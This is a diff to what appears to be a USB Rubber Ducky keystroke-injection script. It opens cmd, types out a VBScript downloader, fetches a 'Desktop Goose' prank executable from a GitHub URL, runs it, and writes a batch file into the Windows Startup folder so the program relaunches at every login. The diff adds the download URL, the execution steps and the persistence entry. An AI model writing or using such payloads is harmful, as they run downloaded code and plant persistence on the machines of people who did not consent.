@@ -5,6 +5,8 @@ STRING cmd
 DELAY 400
 ENTER
 DELAY 400
+STRING cd C:\
+ENTER
 STRING copy con download.vbs
 ENTER
 STRING Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
@@ -25,9 +27,23 @@ STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
 ENTER
 CTRL z
 ENTER
-STRING cscript download.vbs 
+STRING cscript download.vbs https://github.com/QuantumThings/goose-desktop-0.3-for-rubber-ducky/raw/e023a6db34a08a5fa453eba7e140059374db06db/DesktopGoose%20v0.3%20Extractor.exe
 ENTER
-STRING <INSERT EXE FILENAME HERE>
+STRING DesktopGoose%20v0.3%20Extractor.exe
+ENTER
+DELAY 400
+ENTER
+DELAY 400
+STRING cd DesktopGoose%20v0.3
+ENTER
+STRING copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoGoose.bat"
+STRING @echo off
+ENTER
+STRING START C:\DesktopGoose%20v0.3\GooseDesktop.exe
+ENTER
+CTRL z
+ENTER
+STRING GooseDesktop.exe
 ENTER
 STRING exit
 ENTER
